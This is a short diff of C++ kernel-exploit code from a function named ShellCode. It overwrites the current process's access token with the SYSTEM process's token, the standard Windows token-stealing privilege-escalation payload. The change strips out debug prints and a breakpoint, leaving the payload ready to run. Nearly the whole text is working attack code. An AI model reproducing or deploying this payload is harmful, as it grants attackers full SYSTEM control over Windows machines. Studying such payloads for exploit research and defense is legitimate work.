@@ -133,14 +133,9 @@ static auto ShellCode() -> void {
 
 	auto currProcess = *(void**)((byte*)currThread + 0x50);
 
-	//auto currProcessToken = *(void**)((byte*)currProcess + 0xf8);
-
 	auto currProcessTokenOffset = ((byte*)currProcess + 0xf8);
 	auto systemProcessTokenOffset = ((byte*)systemEProcess + 0xf8);
 	*(void**)currProcessTokenOffset = *(void**)systemProcessTokenOffset;
-	DbgPrint("\t[*] currProcessTokenOffset : %p\n", currProcessTokenOffset);
-	DbgPrint("\t[*] systemProcessTokenOffset : %p\n", systemProcessTokenOffset);
-	__asm int 3;
 
 	return;
 }
